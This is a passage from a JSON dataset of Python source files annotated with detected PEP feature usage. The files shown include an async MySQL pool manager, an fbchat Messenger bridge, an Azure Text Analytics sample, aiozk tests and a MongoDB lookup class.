conn.cursor()\n            print(await cur.execute('select 1'))\n        finally:\n            await cur.close()\n            await mysql_pool.release(conn)\n        async with mysql_manager.get('xx') as (conn, cur):\n            print(await cur.execute('select 1'))\n        await mysql_manager.close_all()\n    asyncio.run(test())",
            "patterns": {
                "pep_468": [
                    [
                        16,
                        "create_pool(**params)"
                    ]
                ],
                "pep_567": [
                    [
                        44,
                        44,
                        "import",
                        "    import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        1,
                        "from typing import Union, Tuple",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        7,
                        "    def parse_params(alias_or_params: Union[str, dict]) -> Tuple[str, Union[dict, None]]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        19,
                        31,
                        "async generator",
                        "async def get(self, alias_or_params: Union[str, dict], ping=False):\n        assert isinstance(alias_or_params, (str, dict)), \"alias_or_params \u53c2\u6570\u4e0d\u6b63\u786e\"\n        alias, params = self.parse_params(alias_or_params)\n        mysql_pool = self._clients.get(alias)\n        if not mysql_pool:\n            mysql_pool = await self.create(params, alias)\n        conn = await mysql_pool.acquire()\n        if ping:\n            await conn.ping()\n        cur = await conn.cursor()\n        yield conn, cur\n        await cur.close()\n        await mysql_pool.release(conn)"
                    ]
                ],
                "pep_498": [
                    [
                        11,
                        "        alias = mysql_params.pop('alias', f\"{mysql_params['host']}{mysql_params['port']}\")"
                    ]
                ]
            }
        },
        "124": {
            "file": "import asyncio\nimport atexit\nimport getpass\nimport fbchat\nimport os\nimport json\nimport toml\nimport logging\nimport httpx\nimport re\nimport base64\nfrom aiohttp import ClientSession\nimport secrets\nif os.name == \"nt\":\n    asyncio.DefaultEventLoopPolicy = asyncio.WindowsSelectorEventLoopPolicy\nthreads = dict()\nusers = dict()\nreverse_threads = dict()\nremote_nick_format = \"\"\nstream_api_url = ''\nmessage_api_url = ''\napi_client = httpx.AsyncClient()\nfb_listener_global = None\nrun_infinite_timer = True\ntimeout_listen = 3600\nasync def send_msg_to_api(gateway, text, username=''):\n    if text is not None:\n        headers = {'content-type': 'application/json'}\n        payload = {\"text\": text, \"username\": username, \"gateway\": gateway}\n        async with httpx.AsyncClient() as client:\n            await client.post(message_api_url, data=json.dumps(payload), headers=headers)\ndef load_cookies(filename):\n    try:\n        with open(filename) as f:\n            return json.load(f)\n    except FileNotFoundError as e:\n        logging.error(e)\n        return  \ndef save_cookies(filename, cookies):\n    with open(filename, \"w\") as f:\n        json.dump(cookies, f)\nasync def load_session(cookies, cookie_domain):\n    if not cookies:\n        return\n    try:\n        return await fbchat.Session.from_cookies(cookies, domain=cookie_domain)\n    except fbchat.FacebookError as e:\n        logging.error(e)\n        return  \nasync def find_file_type(search_text, search_link=True, url_protocol=\"http\"):\n    types = {\"image\": [\"jpg\", \"png\", \"jpeg\", \"gif\", \"webp\"], \"video\": [\"webm\"]}\n    found_type = None\n    found_url = None\n    found_cat = None\n    for tp in types:\n        for find_tp in types[tp]:\n            try:\n                if search_link is True:\n                    find_img_url = re.search(url_protocol + r\".+\\.(\" + find_tp + \")\", search_text)\n                else:\n                    find_img_url = re.search(r\".+\\.(\" + find_tp + ')$', search_text)\n            except TypeError as e:\n                logging.info(f\"searching for file returned: {e}\")\n                break\n            else:\n                if find_img_url:\n                    found_url = find_img_url.group(0)\n                    found_type = find_img_url.group(1)\n                    found_cat = tp\n                    logging.info(f\"found_url: {found_url} ; found_type: {found_type} ; found_cat: {found_cat}\")\n                    break\n    if found_type == \"jpg\":\n        found_type = \"jpeg\"\n    if found_type == \"webp\":\n        found_type = \"png\"\n    return found_type, found_url, found_cat\nasync def listen_api(session, fbchat_client):\n    timeout = httpx.Timeout(10.0, read=None)\n    logging.info(\"Starting api_client stream\")\n    async with api_client.stream(method=\"GET\", url=stream_api_url, timeout=timeout) as r:\n        logging.info(f\"response: {r}\")\n        try:\n            async for msg in r.aiter_lines():\n                resp_json = json.loads(msg)\n                if resp_json:\n                    got_gateway = resp_json.get(\"gateway\")\n                    got_text = resp_json.get(\"text\")\n                    got_username = resp_json.get(\"username\")\n                    search_link = True\n                    try:\n                        filedata = resp_json[\"Extra\"][\"file\"][0][\"Data\"]\n                    except (KeyError, TypeError):\n                        logging.info(f\"From api received json: {resp_json}\")\n                    else:\n                        search_link = False\n                        filedata = base64.standard_b64decode(filedata)\n                        got_text = resp_json[\"Extra\"][\"file\"][0][\"Name\"]\n                    img_type_result, filename, cat = await find_file_type(search_text=got_text, search_link=search_link)\n                    if filename == got_text and search_link is False:\n                        got_text = f\"sent {img_type_result} file\"\n                    if got_gateway:\n                        fb_thread = reverse_threads[got_gateway]\n                        if fb_thread in users:\n                            thread = fbchat.User(session=session, id=fb_thread)\n                        else:\n                            thread = fbchat.Group(session=session, id=fb_thread)\n                        if img_type_result is not None:\n                            if search_link is True:\n                                async with ClientSession() as sess, sess.get(filename) as resp:\n                                    image_data = await resp.read()\n                            else:\n                                image_data = filedata\n                            try:\n                                files = await fbchat_client.upload(\n                                    [(filename, image_data, cat + \"/\" + img_type_result)]\n                                )\n                                try:\n                                    await thread.send_text(text=f\"{got_username}\", files=files)\n                                except fbchat.FacebookError as e:\n                                    logging.error(e)\n                            except fbchat.ExternalError as e:\n                                logging.error(e)\n                        if len(got_text.splitlines()) > 1 and got_text.startswith('>'):\n                            split_lines = got_text.splitlines()\n                            got_text = ''\n                            count = 0\n                            for line in split_lines:\n                                if not line.startswith('>'):\n                                    break\n                                count += 1\n                            try:\n                                split_lines[count] = '\\n' + split_lines[count]\n                            except IndexError:\n                                pass\n                            for line in split_lines:\n                                got_text += '\\n' + line\n                        elif got_text.startswith('>'):\n                            got_text = '\\n' + got_text\n                        logging.info(f\"From api sending message: username: {got_username} | text: {got_text}\")\n                        try:\n                            await thread.send_text(f\"{got_username}{got_text}\")\n                        except fbchat.FacebookError as e:\n                            logging.error(e)\n                        logging.info(f\"Sent message: username: {got_username} | text: {got_text}\")\n        except httpx.RemoteProtocolError as e:\n            logging.error(e)\n    logging.error(f\"out of api_client stream\")\n    try:\n        fb_listener_global.disconnect()\n    except fbchat.FacebookError as e:\n        logging.error(e)\n    global run_infinite_timer\n    run_infinite_timer = False\n    global timeout_listen\n    timeout_listen = 1\n    logging.info(\"Stopping infinite timer loop.\")\nasync def get_attachments(attachments, send_text, client):\n    url = ''\n    if isinstance(attachments[0], fbchat.ShareAttachment) or \\\n            isinstance(attachments[0], fbchat.VideoAttachment) or \\\n            isinstance(attachments[0], fbchat.AudioAttachment):  \n        return send_text  \n    if isinstance(attachments[0], fbchat.ImageAttachment):\n        url = await client.fetch_image_url(attachments[0].id)\n    logging.info(f\"Got URL: {url}\")\n    if send_text is not None:\n        send_text = f\"{url} {send_text}\"\n    else:\n        send_text = f\"{url}\"\n    return send_text\nasync def listen_fb(fb_listener, session, client):\n    logging.info(\"Listening for fb events\")\n    try:\n        async for event in fb_listener.listen():\n            if isinstance(event, fbchat.MessageEvent) or isinstance(event, fbchat.MessageReplyEvent):\n                run_rest = True\n                if event.author.id == session.user.id:\n                    try:\n                        regex = re.search(r'' + remote_nick_format, event.message.text)\n                    except TypeError:\n                        pass  \n                    else:\n                        if regex:\n                            run_rest = False\n                if run_rest is True:\n                    logging.info(f\"From fb event: {event}\")\n                    logging.info(\n                        f\"From fb received: \"\n                        f\"message: {event.message.text} | \"\n                        f\"from user: {event.author.id} | \"\n                        f\"in thread: {event.thread.id}\")\n                    gateway = \"\"\n                    username = \"\"\n                    if event.thread.id in threads:\n                        gateway = threads[event.thread.id]\n                    if event.author.id in users:\n                        username = users[event.author.id]\n                    send_text = event.message.text\n                    if event.message.attachments:\n                        send_text = await get_attachments(event.message.attachments, send_text, client)\n                    if isinstance(event, fbchat.MessageEvent):\n                        logging.info(\n                            f\"From fb sending to api: \"\n                            f\"username: {username} | \"\n                            f\"gateway: {gateway} | \"\n                            f\"message: {event.message.text}\")\n                        await send_msg_to_api(gateway, send_text, username)\n                        logging.info(f\"Sent message to api: event.message.text: {event.message.text}\")\n                    elif isinstance(event, fbchat.MessageReplyEvent):\n                        random_token = secrets.token_hex(nbytes=2)\n                        reply = event.replied_to\n                        logging.info(\n                            f\"From fb sending to api (reply): \"\n                            f\"username: {username} | \"\n                            f\"gateway: {gateway} | \"\n                            f\"message: {event.message.text} | \"\n                            f\"reply author: {reply.author}\")\n                        event_msg = send_text\n                        author_nick = None\n                        if reply.author != '':\n                            author_nick = users.get(reply.author)\n                        format_event_msg = ''\n                        for line in event_msg.splitlines(keepends=True):\n                            format_event_msg += f\"({random_token}) {line}\"\n                        event_msg = f\"[Reply]: \\n\" + format_event_msg\n                        if event.replied_to.attachments:\n                            event_msg = await get_attachments(event.replied_to.attachments, event_msg, client)\n                            event_msg += f\"\\n({random_token}) [Attachment from]: {author_nick}\"\n                        format_only_reply_msg = ''\n                        if reply.text is not None:\n                            format_only_reply_msg += f\"[Quote from]: {author_nick}:\\n\"\n                            for line in reply.text.splitlines(keepends=True):\n                                format_only_reply_msg += f\"({random_token}) {line}\"\n                        format_whole_reply_msg = \\\n                            f\"({random_token}) {format_only_reply_msg}\\n\" \\\n                            f\"({random_token}) {event_msg}\"\n                        await send_msg_to_api(gateway, format_whole_reply_msg, username)\n                        logging.info(f\"Sent message to api: event_msg: {event_msg}\")\n        logging.warning(\"Out of fb listener loop.\")\n    except fbchat.FacebookError as e:\n        logging.error(e)\n        await api_client.aclose()\n        return\nasync def timeout_listen_fb():\n    logging.info(f\"Fb listener timeout restarted: {timeout_listen} sec\")\n    await asyncio.sleep(timeout_listen)\n    try:\n        fb_listener_global.disconnect()\n    except fbchat.FacebookError as e:\n        logging.error(e)\n        exit()\n    logging.info(\"Executed listener disconnect\")\nasync def main():\n    logging.basicConfig(level=logging.INFO)  \n    logging.info(\"Logging started\")\n    global threads\n    global users\n    global reverse_threads\n    global remote_nick_format\n    global stream_api_url\n    global message_api_url\n    if not os.path.exists(\"fbridge-config.toml\"):\n        logging.error(\"Config file fbridge-config.toml doesn't exist\")\n        return\n    parsed_toml = toml.load(\"fbridge-config.toml\")\n    stream_api_url = parsed_toml[\"stream_api_url\"]\n    message_api_url = parsed_toml[\"message_api_url\"]\n    cookie_domain = parsed_toml[\"cookie_domain\"]\n    th = parsed_toml[\"threads\"]\n    us = parsed_toml[\"users\"]\n    for key, value in th.items():\n        threads[key] = value[\"gateway\"]\n    for key, value in us.items():\n        users[key] = value[\"username\"]\n    reverse_threads = {v: k for k, v in threads.items()}\n    remote_nick_format = parsed_toml[\"RemoteNickFormat\"]\n    cookies = load_cookies(\"session.json\")\n    session = await load_session(cookies, cookie_domain)\n    if not session:\n        logging.error(\"Session could not be loaded, login instead!\")\n        session = await fbchat.Session.login(getpass.getuser(), getpass.getpass())\n        atexit.register(lambda: save_cookies(\"session.json\", session.get_cookies()))\n    if session:\n        client = fbchat.Client(session=session)\n        global fb_listener_global\n        fb_listener_global = fbchat.Listener(session=session, chat_on=True, foreground=False)\n        fb_listener = fb_listener_global\n        listen_fb_task = asyncio.create_task(listen_fb(fb_listener, session, client))\n        client.sequence_id_callback = fb_listener.set_sequence_id\n        await client.fetch_threads(limit=1).__anext__()\n        asyncio.create_task(listen_api(session, client))\n        while run_infinite_timer is True:\n            asyncio.create_task(timeout_listen_fb())\n            await listen_fb_task\n            listen_fb_task = asyncio.create_task(listen_fb(fb_listener, session, client))\n    else:\n        logging.error(\"No session was loaded, you either need the cookies or a proper login.\")\nasyncio.run(main())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        174,
                        238,
                        "async for",
                        "async for event in fb_listener.listen():\n            if isinstance(event, fbchat.MessageEvent) or isinstance(event, fbchat.MessageReplyEvent):\n                run_rest = True\n                if event.author.id == session.user.id:\n                    try:\n                        regex = re.search(r'' + remote_nick_format, event.message.text)\n                    except TypeError:\n                        pass  \n                    else:\n                        if regex:\n                            run_rest = False\n                if run_rest is True:\n                    logging.info(f\"From fb event: {event}\")\n                    logging.info(\n                        f\"From fb received: \"\n                        f\"message: {event.message.text} | \"\n                        f\"from user: {event.author.id} | \"\n                        f\"in thread: {event.thread.id}\")\n                    gateway = \"\"\n                    username = \"\"\n                    if event.thread.id in threads:\n                        gateway = threads[event.thread.id]\n                    if event.author.id in users:\n                        username = users[event.author.id]\n                    send_text = event.message.text\n                    if event.message.attachments:\n                        send_text = await get_attachments(event.message.attachments, send_text, client)\n                    if isinstance(event, fbchat.MessageEvent):\n                        logging.info(\n                            f\"From fb sending to api: \"\n                            f\"username: {username} | \"\n                            f\"gateway: {gateway} | \"\n                            f\"message: {event.message.text}\")\n                        await send_msg_to_api(gateway, send_text, username)\n                        logging.info(f\"Sent message to api: event.message.text: {event.message.text}\")\n                    elif isinstance(event, fbchat.MessageReplyEvent):\n                        random_token = secrets.token_hex(nbytes=2)\n                        reply = event.replied_to\n                        logging.info(\n                            f\"From fb sending to api (reply): \"\n                            f\"username: {username} | \"\n                            f\"gateway: {gateway} | \"\n                            f\"message: {event.message.text} | \"\n                            f\"reply author: {reply.author}\")\n                        event_msg = send_text\n                        author_nick = None\n                        if reply.author != '':\n                            author_nick = users.get(reply.author)\n                        format_event_msg = ''\n                        for line in event_msg.splitlines(keepends=True):\n                            format_event_msg += f\"({random_token}) {line}\"\n                        event_msg = f\"[Reply]: \\n\" + format_event_msg\n                        if event.replied_to.attachments:\n                            event_msg = await get_attachments(event.replied_to.attachments, event_msg, client)\n                            event_msg += f\"\\n({random_token}) [Attachment from]: {author_nick}\"\n                        format_only_reply_msg = ''\n                        if reply.text is not None:\n                            format_only_reply_msg += f\"[Quote from]: {author_nick}:\\n\"\n                            for line in reply.text.splitlines(keepends=True):\n                                format_only_reply_msg += f\"({random_token}) {line}\"\n                        format_whole_reply_msg = \\\n                            f\"({random_token}) {format_only_reply_msg}\\n\" \\\n                            f\"({random_token}) {event_msg}\"\n                        await send_msg_to_api(gateway, format_whole_reply_msg, username)\n                        logging.info(f\"Sent message to api: event_msg: {event_msg}\")"
                    ],
                    [
                        83,
                        144,
                        "async for",
                        "async for msg in r.aiter_lines():\n                resp_json = json.loads(msg)\n                if resp_json:\n                    got_gateway = resp_json.get(\"gateway\")\n                    got_text = resp_json.get(\"text\")\n                    got_username = resp_json.get(\"username\")\n                    search_link = True\n                    try:\n                        filedata = resp_json[\"Extra\"][\"file\"][0][\"Data\"]\n                    except (KeyError, TypeError):\n                        logging.info(f\"From api received json: {resp_json}\")\n                    else:\n                        search_link = False\n                        filedata = base64.standard_b64decode(filedata)\n                        got_text = resp_json[\"Extra\"][\"file\"][0][\"Name\"]\n                    img_type_result, filename, cat = await find_file_type(search_text=got_text, search_link=search_link)\n                    if filename == got_text and search_link is False:\n                        got_text = f\"sent {img_type_result} file\"\n                    if got_gateway:\n                        fb_thread = reverse_threads[got_gateway]\n                        if fb_thread in users:\n                            thread = fbchat.User(session=session, id=fb_thread)\n                        else:\n                            thread = fbchat.Group(session=session, id=fb_thread)\n                        if img_type_result is not None:\n                            if search_link is True:\n                                async with ClientSession() as sess, sess.get(filename) as resp:\n                                    image_data = await resp.read()\n                            else:\n                                image_data = filedata\n                            try:\n                                files = await fbchat_client.upload(\n                                    [(filename, image_data, cat + \"/\" + img_type_result)]\n                                )\n                                try:\n                                    await thread.send_text(text=f\"{got_username}\", files=files)\n                                except fbchat.FacebookError as e:\n                                    logging.error(e)\n                            except fbchat.ExternalError as e:\n                                logging.error(e)\n                        if len(got_text.splitlines()) > 1 and got_text.startswith('>'):\n                            split_lines = got_text.splitlines()\n                            got_text = ''\n                            count = 0\n                            for line in split_lines:\n                                if not line.startswith('>'):\n                                    break\n                                count += 1\n                            try:\n                                split_lines[count] = '\\n' + split_lines[count]\n                            except IndexError:\n                                pass\n                            for line in split_lines:\n                                got_text += '\\n' + line\n                        elif got_text.startswith('>'):\n                            got_text = '\\n' + got_text\n                        logging.info(f\"From api sending message: username: {got_username} | text: {got_text}\")\n                        try:\n                            await thread.send_text(f\"{got_username}{got_text}\")\n                        except fbchat.FacebookError as e:\n                            logging.error(e)\n                        logging.info(f\"Sent message: username: {got_username} | text: {got_text}\")"
                    ]
                ],
                "pep_498": [
                    [
                        147,
                        "    logging.error(f\"out of api_client stream\")"
                    ],
                    [
                        165,
                        "    logging.info(f\"Got URL: {url}\")"
                    ],
                    [
                        167,
                        "        send_text = f\"{url} {send_text}\""
                    ],
                    [
                        169,
                        "        send_text = f\"{url}\""
                    ],
                    [
                        245,
                        "    logging.info(f\"Fb listener timeout restarted: {timeout_listen} sec\")"
                    ],
                    [
                        81,
                        "        logging.info(f\"response: {r}\")"
                    ],
                    [
                        63,
                        "                logging.info(f\"searching for file returned: {e}\")"
                    ],
                    [
                        70,
                        "                    logging.info(f\"found_url: {found_url} ; found_type: {found_type} ; found_cat: {found_cat}\")"
                    ],
                    [
                        100,
                        "                        got_text = f\"sent {img_type_result} file\""
                    ],
                    [
                        186,
                        "                    logging.info(f\"From fb event: {event}\")"
                    ],
                    [
                        188,
                        "                        f\"From fb received: \""
                    ],
                    [
                        139,
                        "                        logging.info(f\"From api sending message: username: {got_username} | text: {got_text}\")"
                    ],
                    [
                        144,
                        "                        logging.info(f\"Sent message: username: {got_username} | text: {got_text}\")"
                    ],
                    [
                        203,
                        "                            f\"From fb sending to api: \""
                    ],
                    [
                        208,
                        "                        logging.info(f\"Sent message to api: event.message.text: {event.message.text}\")"
                    ],
                    [
                        235,
                        "                            f\"({random_token}) {format_only_reply_msg}\\n\" \\"
                    ],
                    [
                        93,
                        "                        logging.info(f\"From api received json: {resp_json}\")"
                    ],
                    [
                        213,
                        "                            f\"From fb sending to api (reply): \""
                    ],
                    [
                        224,
                        "                            format_event_msg += f\"({random_token}) {line}\""
                    ],
                    [
                        225,
                        "                        event_msg = f\"[Reply]: \\n\" + format_event_msg"
                    ],
                    [
                        228,
                        "                            event_msg += f\"\\n({random_token}) [Attachment from]: {author_nick}\""
                    ],
                    [
                        231,
                        "                            format_only_reply_msg += f\"[Quote from]: {author_nick}:\\n\""
                    ],
                    [
                        238,
                        "                        logging.info(f\"Sent message to api: event_msg: {event_msg}\")"
                    ],
                    [
                        141,
                        "                            await thread.send_text(f\"{got_username}{got_text}\")"
                    ],
                    [
                        233,
                        "                                format_only_reply_msg += f\"({random_token}) {line}\""
                    ],
                    [
                        118,
                        "                                    await thread.send_text(text=f\"{got_username}\", files=files)"
                    ]
                ]
            }
        },
        "125": {
            "file": "import os\nimport asyncio\nasync def sample_analyze_async():\n    from azure.core.credentials import AzureKeyCredential\n    from azure.ai.textanalytics.aio import TextAnalyticsClient\n    from azure.ai.textanalytics import (\n        RecognizeEntitiesAction,\n        RecognizeLinkedEntitiesAction,\n        RecognizePiiEntitiesAction,\n        ExtractKeyPhrasesAction,\n        AnalyzeSentimentAction,\n    )\n    endpoint = os.environ[\"AZURE_TEXT_ANALYTICS_ENDPOINT\"]\n    key = os.environ[\"AZURE_TEXT_ANALYTICS_KEY\"]\n    text_analytics_client = TextAnalyticsClient(\n        endpoint=endpoint,\n        credential=AzureKeyCredential(key),\n    )\n    documents = [\n        'We went to Contoso Steakhouse located at midtown NYC last week for a dinner party, and we adore the spot!'\\\n        'They provide marvelous food and they have a great menu. The chief cook happens to be the owner (I think his name is John Doe)'\\\n        'and he is super nice, coming out of the kitchen and greeted us all.'\\\n        ,\n        'We enjoyed very much dining in the place!'\\\n        'The Sirloin steak I ordered was tender and juicy, and the place was impeccably clean. You can even pre-order from their'\\\n        'online menu at www.contososteakhouse.com, call 312-555-0176 or send email to order@contososteakhouse.com!'\\\n        'The only complaint I have is the food didn\\'t come fast enough. Overall I highly recommend it!'\\\n    ]\n    async with text_analytics_client:\n        poller = await text_analytics_client.begin_analyze_actions(\n            documents,\n            display_name=\"Sample Text Analysis\",\n            actions=[\n                RecognizeEntitiesAction(),\n                RecognizePiiEntitiesAction(),\n                ExtractKeyPhrasesAction(),\n                RecognizeLinkedEntitiesAction(),\n                AnalyzeSentimentAction()\n            ]\n        )\n        pages = await poller.result()\n        document_results = []\n        async for page in pages:\n            document_results.append(page)\n        for doc, action_results in zip(documents, document_results):\n            print(\"\\nDocument text: {}\".format(doc))\n            recognize_entities_result = action_results[0]\n            print(\"...Results of Recognize Entities Action:\")\n            if recognize_entities_result.is_error:\n                print(\"...Is an error with code '{}' and message '{}'\".format(\n                    recognize_entities_result.code, recognize_entities_result.message\n                ))\n            else:\n                for entity in recognize_entities_result.entities:\n                    print(\"......Entity: {}\".format(entity.text))\n                    print(\".........Category: {}\".format(entity.category))\n                    print(\".........Confidence Score: {}\".format(entity.confidence_score))\n                    print(\".........Offset: {}\".format(entity.offset))\n            recognize_pii_entities_result = action_results[1]\n            print(\"...Results of Recognize PII Entities action:\")\n            if recognize_pii_entities_result.is_error:\n                print(\"...Is an error with code '{}' and message '{}'\".format(\n                    recognize_pii_entities_result.code, recognize_pii_entities_result.message\n                ))\n            else:\n                for entity in recognize_pii_entities_result.entities:\n                    print(\"......Entity: {}\".format(entity.text))\n                    print(\".........Category: {}\".format(entity.category))\n                    print(\".........Confidence Score: {}\".format(entity.confidence_score))\n            extract_key_phrases_result = action_results[2]\n            print(\"...Results of Extract Key Phrases action:\")\n            if extract_key_phrases_result.is_error:\n                print(\"...Is an error with code '{}' and message '{}'\".format(\n                    extract_key_phrases_result.code, extract_key_phrases_result.message\n                ))\n            else:\n                print(\"......Key Phrases: {}\".format(extract_key_phrases_result.key_phrases))\n            recognize_linked_entities_result = action_results[3]\n            print(\"...Results of Recognize Linked Entities action:\")\n            if recognize_linked_entities_result.is_error:\n                print(\"...Is an error with code '{}' and message '{}'\".format(\n                    recognize_linked_entities_result.code, recognize_linked_entities_result.message\n                ))\n            else:\n                for linked_entity in recognize_linked_entities_result.entities:\n                    print(\"......Entity name: {}\".format(linked_entity.name))\n                    print(\".........Data source: {}\".format(linked_entity.data_source))\n                    print(\".........Data source language: {}\".format(linked_entity.language))\n                    print(\".........Data source entity ID: {}\".format(linked_entity.data_source_entity_id))\n                    print(\".........Data source URL: {}\".format(linked_entity.url))\n                    print(\".........Document matches:\")\n                    for match in linked_entity.matches:\n                        print(\"............Match text: {}\".format(match.text))\n                        print(\"............Confidence Score: {}\".format(match.confidence_score))\n                        print(\"............Offset: {}\".format(match.offset))\n                        print(\"............Length: {}\".format(match.length))\n            analyze_sentiment_result = action_results[4]\n            print(\"...Results of Analyze Sentiment action:\")\n            if analyze_sentiment_result.is_error:\n                print(\"...Is an error with code '{}' and message '{}'\".format(\n                    analyze_sentiment_result.code, analyze_sentiment_result.message\n                ))\n            else:\n                print(\"......Overall sentiment: {}\".format(analyze_sentiment_result.sentiment))\n                print(\"......Scores: positive={}; neutral={}; negative={} \\n\".format(\n                    analyze_sentiment_result.confidence_scores.positive,\n                    analyze_sentiment_result.confidence_scores.neutral,\n                    analyze_sentiment_result.confidence_scores.negative,\n                ))\n            print(\"------------------------------------------\")\nasync def main():\n    await sample_analyze_async()\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        43,
                        44,
                        "async for",
                        "async for page in pages:\n            document_results.append(page)"
                    ]
                ],
                "pep_498v": [
                    [
                        46,
                        46,
                        ".format()"
                    ],
                    [
                        50,
                        52,
                        ".format()"
                    ],
                    [
                        62,
                        64,
                        ".format()"
                    ],
                    [
                        73,
                        75,
                        ".format()"
                    ],
                    [
                        77,
                        77,
                        ".format()"
                    ],
                    [
                        81,
                        83,
                        ".format()"
                    ],
                    [
                        100,
                        102,
                        ".format()"
                    ],
                    [
                        104,
                        104,
                        ".format()"
                    ],
                    [
                        105,
                        109,
                        ".format()"
                    ],
                    [
                        55,
                        55,
                        ".format()"
                    ],
                    [
                        56,
                        56,
                        ".format()"
                    ],
                    [
                        57,
                        57,
                        ".format()"
                    ],
                    [
                        58,
                        58,
                        ".format()"
                    ],
                    [
                        67,
                        67,
                        ".format()"
                    ],
                    [
                        68,
                        68,
                        ".format()"
                    ],
                    [
                        69,
                        69,
                        ".format()"
                    ],
                    [
                        86,
                        86,
                        ".format()"
                    ],
                    [
                        87,
                        87,
                        ".format()"
                    ],
                    [
                        88,
                        88,
                        ".format()"
                    ],
                    [
                        89,
                        89,
                        ".format()"
                    ],
                    [
                        90,
                        90,
                        ".format()"
                    ],
                    [
                        93,
                        93,
                        ".format()"
                    ],
                    [
                        94,
                        94,
                        ".format()"
                    ],
                    [
                        95,
                        95,
                        ".format()"
                    ],
                    [
                        96,
                        96,
                        ".format()"
                    ]
                ]
            }
        },
        "126": {
            "file": "import asyncio\nimport logging\nimport uuid\nimport pytest\nfrom aiozk import WatchEvent\nfrom .conftest import get_client\nlogging.getLogger('asyncio').setLevel(logging.DEBUG)\n@pytest.fixture\nasync def full_zk(zk, path):\n    child_1 = f'{path}/{uuid.uuid4().hex}'\n    child_2 = f'{path}/{uuid.uuid4().hex}'\n    await zk.create(path)\n    await zk.create(child_1)\n    await zk.create(child_2)\n    yield zk\n    await zk.delete(child_2)\n    await zk.delete(child_1)\n    await zk.delete(path)\n@pytest.mark.asyncio\nasync def test_children(full_zk, path):\n    resp = await full_zk.get_children(path)\n    assert len(resp) == 2\n@pytest.mark.asyncio\nasync def test_cancel_crash(zk, path):\n    async def wait_loop():\n        while 1:\n            await zk.wait_for_events([WatchEvent.DATA_CHANGED], path)\n    f = asyncio.ensure_future(wait_loop())\n    f.cancel()\n@pytest.mark.asyncio\nasync def test_closed_close():\n    zk = get_client()\n    await asyncio.wait_for(zk.session.close(), 2)\n@pytest.mark.asyncio\nasync def test_raw_get(full_zk, path):\n    data, stat = await full_zk.get(path)\n    assert data is None\n    assert stat.version == 0\n@pytest.mark.asyncio\nasync def test_raw_set(full_zk, path):\n    stat = await full_zk.set(path, 'asdf', -1)\n    assert stat.data_length == 4\n    assert stat.version == 1",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        9,
                        18,
                        "async generator",
                        "async def full_zk(zk, path):\n    child_1 = f'{path}/{uuid.uuid4().hex}'\n    child_2 = f'{path}/{uuid.uuid4().hex}'\n    await zk.create(path)\n    await zk.create(child_1)\n    await zk.create(child_2)\n    yield zk\n    await zk.delete(child_2)\n    await zk.delete(child_1)\n    await zk.delete(path)"
                    ]
                ],
                "pep_498": [
                    [
                        10,
                        "    child_1 = f'{path}/{uuid.uuid4().hex}'"
                    ],
                    [
                        11,
                        "    child_2 = f'{path}/{uuid.uuid4().hex}'"
                    ]
                ]
            }
        },
        "127": {
            "file": "from ..abc.lookup import MappingLookup\nfrom ..abc.lookup import AsyncLookupMixin\nfrom ..cache import CacheDict\nimport asyncio\nimport logging\nL = logging.getLogger(__name__)\nclass MongoDBLookup(MappingLookup, AsyncLookupMixin):\n\tConfigDefaults = {\n\t\t'database': '',  \n\t\t'collection': '',  \n\t\t'key': '',  \n\t\t'changestream': False\n\t}\n\t@classmethod\n\tdef construct(cls, app, definition: dict, connection_id=\"MongoDBConnection\"):\n\t\t_id = definition.get(\"id\", definition.get(\"declaration\"))\n\t\tconfig = definition.get(\"config\")\n\t\tsvc = app.get_service(\"bspump.PumpService\")\n\t\tmongodb_connection = svc.locate_connection(connection_id)\n\t\treturn cls(app, connection=mongodb_connection, id=_id, config=config)\n\tdef __init__(self, app, connection, id=None, config=None, cache=None):\n\t\tsuper().__init__(app, id=id, config=config)\n\t\tself.Connection = connection\n\t\tself.Database = self.Config['database']\n\t\tself.Collection = self.Config['collection']\n\t\tself.Key = self.Config['key']\n\t\tself.Changestream = self.Config.getboolean(\"changestream\")\n\t\tself.Loop = app.Loop\n\t\tself._changestream_future = None\n\t\tif len(self.Database) == 0:\n\t\t\tself.Database = self.Connection.Database\n\t\tif self.Changestream:\n\t\t\tself._changestream_future = asyncio.ensure_future(\n\t\t\t\tself._changestream(),\n\t\t\t\tloop=self.Loop,\n\t\t\t)\n\t\tself.Count = -1\n\t\tif cache is None:\n\t\t\tself.Cache = CacheDict()\n\t\telse:\n\t\t\tself.Cache = cache\n\t\tmetrics_service = app.get_service('asab.MetricsService')\n\t\tself.CacheCounter = metrics_service.create_counter(\"mongodb.lookup\", tags={}, init_values={'hit': 0, 'miss': 0})\n\t\tself.SuccessCounter = \\\n\t\t\tmetrics_service.create_counter(\"mongodb.lookup.success\", tags={}, init_values={'hit': 0, 'miss': 0})\n\t\tapp.PubSub.subscribe('Application.tick/10!', self._on_health_check)\n\t\tapp.PubSub.subscribe(\"Application.exit!\", self._on_exit)\n\tdef _on_health_check(self, message_type):\n\t\tif self._changestream_future is not None and self.Changestream:\n\t\t\tif not self._changestream_future.done():\n\t\t\t\treturn\n\t\t\ttry:\n\t\t\t\tself._changestream_future.result()\n\t\t\texcept Exception:\n\t\t\t\tL.exception(\"Unexpected connection future error\")\n\t\t\tself._changestream_future = None\n\t\tassert(self._changestream_future is None)\n\t\tif self.Changestream:\n\t\t\tself._changestream_future = asyncio.ensure_future(\n\t\t\t\tself._changestream(),\n\t\t\t\tloop=self.Loop,\n\t\t\t)\n\tasync def _on_exit(self, message_type):\n\t\tif self._changestream_future is not None:\n\t\t\tself._changestream_future.cancel()\n\tdef build_query(self, key):\n\t\treturn {self.Key: key}\n\tasync def _find_one(self, query):\n\t\treturn await (self.Connection.Client[self.Database][self.Collection]).find_one(query)\n\tasync def _changestream(self):\n\t\ttry:\n\t\t\tasync with self.Connection.Client[self.Database][self.Collection].watch() as stream:\n\t\t\t\tasync for change in 